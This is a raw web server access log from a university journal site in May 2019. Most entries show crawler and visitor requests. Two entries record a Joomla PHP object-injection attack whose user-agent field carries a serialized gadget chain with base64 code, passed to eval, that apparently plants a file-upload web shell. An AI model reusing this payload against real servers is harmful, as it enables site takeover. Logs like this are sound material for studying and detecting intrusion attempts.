132.184.129.44 - - "2019-05-11 00:00:06" https://revistas.ujcm.edu.pe/index.php/rctd/article/download/52/49 200 "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36"
46.229.168.130 - - "2019-05-11 00:02:45" https://revistas.ujcm.edu.pe/index.php/rctd/article/view/45 200 "Mozilla/5.0 (compatible; SemrushBot/3~bl; +http://www.semrush.com/bot.html)"
46.229.168.151 - - "2019-05-11 00:41:22" https://revistas.ujcm.edu.pe/index.php/rctd/article/view/81 200 "Mozilla/5.0 (compatible; SemrushBot/3~bl; +http://www.semrush.com/bot.html)"
40.77.167.66 bot - "2019-05-11 00:43:56" https://revistas.ujcm.edu.pe/index.php/rctd/article/view/15 200 "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
51.75.169.235 - - "2019-05-11 00:49:36" https://revistas.ujcm.edu.pe/index.php/rctd/index 200 "}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";s:866:"eval(base64_decode('JGNoZWNrID0gJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXSAuICIvbGlicmFyaWVzL2xpYnJhcmllcy5waHAiIDsNCiRmcD1mb3BlbigiJGNoZWNrIiwidysiKTsNCmZ3cml0ZSgkZnAsYmFzZTY0X2RlY29kZSgnUEQ5d2FIQU5DbVZqYUc4Z0lraGhZMnRsWkNCQ2VTQkJibTl1ZVcxdmRYTkdiM2hjYmlJN0RRcGxjbkp2Y2w5eVpYQnZjblJwYm1jb01DazdEUW9rYzNsemRHVnRJRDBnSkY5SFJWUmJKMlluWFRzTkNtbG1LQ1J6ZVhOMFpXMGdQVDBnSjJZbktYc05DaVJ6WVhjeElEMGdKRjlHU1V4RlUxc25abWxzWlNkZFd5ZDBiWEJmYm1GdFpTZGRPdzBLSkhOaGR6SWdQU0FrWDBaSlRFVlRXeWRtYVd4bEoxMWJKMjVoYldVblhUc05DbVZqYUc4Z0lqeG1iM0p0SUcxbGRHaHZaRDBuVUU5VFZDY2daVzVqZEhsd1pUMG5iWFZzZEdsd1lYSjBMMlp2Y20wdFpHRjBZU2MrRFFvOGFXNXdkWFFnZEhsd1pUMG5abWxzWlNkdVlXMWxQU2RtYVd4bEp5QXZQZzBLUEdsdWNIVjBJSFI1Y0dVOUozTjFZbTFwZENjZ2RtRnNkV1U5SjNWd2JHOWhaQ0J6YUdWc2JDY2dMejROQ2p3dlptOXliVDRpT3cwS2JXOTJaVjkxY0d4dllXUmxaRjltYVd4bEtDUnpZWGN4TENSellYY3lLVHNOQ24wTkNqOCsnKSk7'));JFactory::getConfig();exit";s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}ðýýý"
51.75.169.235 - - "2019-05-11 00:49:40" https://revistas.ujcm.edu.pe/index.php/rctd/index 200 "}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";s:866:"eval(base64_decode('JGNoZWNrID0gJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXSAuICIvbGlicmFyaWVzL2xpYnJhcmllcy5waHAiIDsNCiRmcD1mb3BlbigiJGNoZWNrIiwidysiKTsNCmZ3cml0ZSgkZnAsYmFzZTY0X2RlY29kZSgnUEQ5d2FIQU5DbVZqYUc4Z0lraGhZMnRsWkNCQ2VTQkJibTl1ZVcxdmRYTkdiM2hjYmlJN0RRcGxjbkp2Y2w5eVpYQnZjblJwYm1jb01DazdEUW9rYzNsemRHVnRJRDBnSkY5SFJWUmJKMlluWFRzTkNtbG1LQ1J6ZVhOMFpXMGdQVDBnSjJZbktYc05DaVJ6WVhjeElEMGdKRjlHU1V4RlUxc25abWxzWlNkZFd5ZDBiWEJmYm1GdFpTZGRPdzBLSkhOaGR6SWdQU0FrWDBaSlRFVlRXeWRtYVd4bEoxMWJKMjVoYldVblhUc05DbVZqYUc4Z0lqeG1iM0p0SUcxbGRHaHZaRDBuVUU5VFZDY2daVzVqZEhsd1pUMG5iWFZzZEdsd1lYSjBMMlp2Y20wdFpHRjBZU2MrRFFvOGFXNXdkWFFnZEhsd1pUMG5abWxzWlNkdVlXMWxQU2RtYVd4bEp5QXZQZzBLUEdsdWNIVjBJSFI1Y0dVOUozTjFZbTFwZENjZ2RtRnNkV1U5SjNWd2JHOWhaQ0J6YUdWc2JDY2dMejROQ2p3dlptOXliVDRpT3cwS2JXOTJaVjkxY0d4dllXUmxaRjltYVd4bEtDUnpZWGN4TENSellYY3lLVHNOQ24wTkNqOCsnKSk7'));JFactory::getConfig();exit";s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}ðýýý"
66.249.79.203 bot - "2019-05-11 00:59:46" https://revistas.ujcm.edu.pe/index.php/rctd/issue/view/7 200 "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
169.48.66.89 - - "2019-05-11 01:04:09" https://revistas.ujcm.edu.pe/index.php/rctd/article/download/80/64 200 "PiplBot (+http://www.pipl.com/bot/)"
169.48.66.89 - - "2019-05-11 01:13:41" https://revistas.ujcm.edu.pe/index.php/rctd/article/download/73/60 200 "PiplBot (+http://www.pipl.com/bot/)"
46.229.168.151 - - "2019-05-11 02:07:36" https://revistas.ujcm.edu.pe/index.php/rctd/article/view/83 200 "Mozilla/5.0 (compatible; SemrushBot/3~bl; +http://www.semrush.com/bot.html)"
46.229.168.138 - - "2019-05-11 02:25:30" https://revistas.ujcm.edu.pe/index.php/rctd/article/view/54 200 "Mozilla/5.0 (compatible; SemrushBot/3~bl; +http://www.semrush.com/bot.html)"
